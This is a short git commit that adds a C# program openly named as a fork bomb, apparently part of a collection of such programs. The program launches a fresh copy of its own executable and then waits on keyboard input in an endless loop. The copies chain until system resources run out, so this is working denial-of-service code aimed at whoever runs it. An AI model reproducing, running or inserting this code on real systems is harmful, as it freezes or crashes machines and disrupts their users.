e75c6404a0274e568c09be1e4f1ed8e8f1834658
CodingGamerHD <cod1nggam3rhd@gmail.com>
2017-12-15 20:32:42 +0000

    Add C# fork bomb

---
+++ fork-bomb.cs
@@ -0,0 +1,16 @@
+﻿using System;
+
+namespace forkbomb
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
+            while (true)
+            {
+                Console.ReadKey();
+            }
+        }
+    }
+}
